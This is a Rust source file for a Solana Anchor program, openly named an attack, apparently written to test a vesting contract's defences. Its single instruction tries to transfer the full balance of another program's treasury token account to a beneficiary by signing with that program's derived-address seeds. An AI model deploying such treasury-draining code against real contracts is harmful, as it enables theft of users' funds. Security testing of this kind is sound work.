#![allow(unexpected_cfgs)]
use anchor_lang::prelude::*;
use anchor_spl::{associated_token, token_interface};

declare_id!("6MrrNQQxtMBDHUeqpiwjiGqYK74qxqsbLNuJC5299Tbf");

#[program]
pub mod attack_treasury_token_account {
    use super::*;

    pub fn initialize(
        ctx: Context<Initialize>,
        company_name: String,
        treasury_bump: u8,
    ) -> Result<()> {
        let transfer_accounts_options = token_interface::TransferChecked {
            from: ctx.accounts.treasury_token_account.to_account_info(),
            to: ctx.accounts.beneficiary_token_account.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
            authority: ctx.accounts.treasury_token_account.to_account_info(),
        };
        let signers_seeds: &[&[&[u8]]] = &[&[
            b"vesting_treasury",
            company_name.as_bytes(),
            &[treasury_bump],
        ]];
        let cpi_ctx = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            transfer_accounts_options,
        )
        .with_signer(signers_seeds);
        let amount = ctx.accounts.treasury_token_account.amount;
        msg!("Greetings from: {:?}", ctx.program_id);
        token_interface::transfer_checked(cpi_ctx, amount, ctx.accounts.mint.decimals)?;
        Ok(())
    }
}

#[derive(Accounts)]
#[instruction(company_name: String, treasury_bump: u8)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub signer: Signer<'info>,
    pub beneficiary: SystemAccount<'info>,
    pub mint: InterfaceAccount<'info, token_interface::Mint>,
    #[account(
        mut,
        token::mint = mint,
        token::authority = treasury_token_account,
        seeds = [b"vesting_treasury", company_name.as_bytes()],
        seeds::program = vesting_program,
        bump = treasury_bump ,
    )]
    pub treasury_token_account: InterfaceAccount<'info, token_interface::TokenAccount>,
    #[account(
        init_if_needed,
        payer = signer,
        associated_token::mint = mint,
        associated_token::authority = beneficiary,
        associated_token::token_program = token_program,
    )]
    pub beneficiary_token_account: InterfaceAccount<'info, token_interface::TokenAccount>,
    /// CHECK: outer program id
    pub vesting_program: AccountInfo<'info>,
    pub token_program: Interface<'info, token_interface::TokenInterface>,
    pub system_program: Program<'info, System>,
    pub associated_token_program: Program<'info, associated_token::AssociatedToken>,
}
